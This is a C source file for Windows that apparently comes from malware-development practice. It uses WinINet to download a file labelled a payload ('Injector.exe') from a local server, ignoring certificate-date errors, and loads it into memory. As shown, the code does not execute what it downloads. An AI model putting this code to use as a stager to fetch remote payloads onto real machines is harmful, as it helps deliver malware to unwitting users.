#include <stdio.h>
#include <Windows.h>
#include <wininet.h>
#pragma comment(lib,"wininet.lib")

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE            = TRUE;

	HINTERNET	hInternet         = NULL,
			    hInternetFile     = NULL;

	DWORD		dwBytesRead       = 0;
	
	SIZE_T		sSize             = 0;
	PBYTE		pBytes            = NULL,
			    pTmpBytes         = NULL;

	hInternet = InternetOpenW(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		if (dwBytesRead == 0) {
			break;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, sSize);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}
		
		memcpy(pBytes + (sSize - dwBytesRead), pTmpBytes, dwBytesRead);
	}

	*pPayloadBytes = pBytes;
	*sPayloadSize  = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}

int main(int argc, char *argv[]) {
	PBYTE payloadBytes = NULL;
	SIZE_T payloadSize = 0;

	if (GetPayloadFromUrl(L"https://127.0.0.1:8000/Injector.exe", &payloadBytes, &payloadSize)) {
		printf("[+] Payload downloaded successfully. Size: %llu bytes.\n", payloadSize);
		LocalFree(payloadBytes);
	} else {
		printf("[!] Failed to download payload.\n");
	}
	return 0;
}
